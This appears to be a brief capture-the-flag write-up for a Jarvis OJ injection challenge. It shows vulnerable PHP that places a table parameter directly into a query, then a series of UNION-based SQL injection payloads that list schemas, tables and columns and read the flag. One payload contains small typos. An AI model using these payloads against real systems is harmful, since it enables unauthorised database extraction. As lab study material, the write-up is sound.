inject

>http://web.jarvisoj.com:32794

```
<?php
require("config.php");
$table = $_GET['table']?$_GET['table']:"test";
$table = Filter($table);
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
$ret = sql_query($sql);
echo $ret[0];
?>
```

```
test`%20`union%20select%20database()%20limit%201,1
```

```
test`%20`union%20select%20group_concat(schema_name)%20from%20information_schema.schemata%20limit%201,1
```

filter '  > database()

```test`%20`union%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()limit%201,1
```

>secret_flag,secret_test

```
test`%20`union%20select%20group_concat(table_name)%20from%20information_schema.column%20where%20table_name=secret_flaglimit%201,1
```

```
test`%20`union%20select%20group_concat(column_name)%20from%20information_schema.columns%20limit%201,1
```

```
test`%20`union%20select%20flagUwillNeverKnow%20from%20secret_flag%20limit%201,1
```